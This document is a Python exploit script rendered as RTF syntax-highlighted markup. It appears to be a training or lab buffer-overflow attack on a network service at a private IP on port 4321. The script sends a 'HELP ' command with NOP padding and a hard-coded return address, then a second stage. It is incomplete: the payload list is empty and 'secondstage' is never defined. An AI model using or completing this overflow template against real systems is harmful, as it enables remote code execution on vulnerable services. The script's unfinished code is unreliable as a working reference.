{\rtf1\ansi\deff0{\fonttbl{\f0\fmodern\fprq1\fcharset0;}}{\colortbl;\red186\green33\blue33;\red25\green23\blue124;\red255\green0\blue0;\red64\green128\blue128;\red0\green0\blue255;\red0\green128\blue0;\red170\green34\blue255;\red102\green102\blue102;\red136\green136\blue136;\red136\green0\blue0;\red176\green0\blue64;\red160\green0\blue0;\red128\green0\blue128;\red0\green68\blue221;\red153\green153\blue153;\red0\green160\blue0;\red160\green160\blue0;\red187\green187\blue187;\red0\green0\blue128;\red125\green144\blue41;\red187\green102\blue136;\red187\green102\blue34;\red188\green122\blue0;\red210\green65\blue58;}\f0{\cf4\i #!/usr/bin/env python3}\par
\par
{\cf6\b from} {\cf5\b socket} {\cf6\b import} socket, AF_INET, SOCK_STREAM, timeout, error\par
{\cf6\b from} {\cf5\b struct} {\cf6\b import} pack\par
{\cf6\b from} {\cf5\b sys} {\cf6\b import} {\cf6 exit}\par
{\cf6\b from} {\cf5\b time} {\cf6\b import} sleep\par
\par
{\cf4\i # CONSTANTS}\par
rhost {\cf8 =} {\cf1 "}{\cf1 192.168.29.201}{\cf1 "}\par
rport {\cf8 =} {\cf8 4321}\par
target {\cf8 =} (rhost, rport)\par
timeout_val {\cf8 =} {\cf8 10}  {\cf4\i # seconds}\par
\par
exploit {\cf8 =} b{\cf1 "}{\cf1 HELP }{\cf1 "}\par
exploit {\cf8 +}{\cf8 =} b{\cf1 "}{\cf22\b \\x90}{\cf1 "} {\cf8 *} {\cf8 7}\par
exploit {\cf8 +}{\cf8 =} b{\cf1 '}{\cf22\b \\x5D}{\cf22\b \\x38}{\cf22\b \\x82}{\cf22\b \\x7C}{\cf1 '}\par
payload {\cf8 =} []\par
exploit {\cf8 +}{\cf8 =} b{\cf1 "}{\cf22\b \\x90}{\cf1 "} {\cf8 *} ({\cf8 42} {\cf8 -} {\cf6 len}(payload))\par
{\cf4\i #exploit += b"\\xCC" * (2 - len(payload))}\par
\par
\par
{\cf6\b if} __name__ {\cf8 ==} {\cf1 '}{\cf1 __main__}{\cf1 '}:\par
    {\cf6\b print}({\cf1 '}{\cf1 [*] creating the socket}{\cf1 '})\par
    s {\cf8 =} socket(AF_INET, SOCK_STREAM)\par
    s{\cf8 .}settimeout(timeout_val)\par
    {\cf6\b print}({\cf1 '}{\cf1 [*] connecting to the target}{\cf1 '})\par
    s{\cf8 .}connect(target)\par
    s{\cf8 .}recv({\cf8 1024})\par
    {\cf6\b print}({\cf1 '}{\cf1 [*] sending exploit}{\cf1 '})\par
    s{\cf8 .}send(exploit)\par
    {\cf6\b print}({\cf1 '}{\cf1 [*] sending out payload value}{\cf1 '})\par
\par
    sleep({\cf8 10})\par
    s{\cf8 .}send(secondstage)\par
    {\cf6\b print}({\cf1 '}{\cf1 [*] cleaning up}{\cf1 '})\par
   {\cf4\i # s.close()}\par
}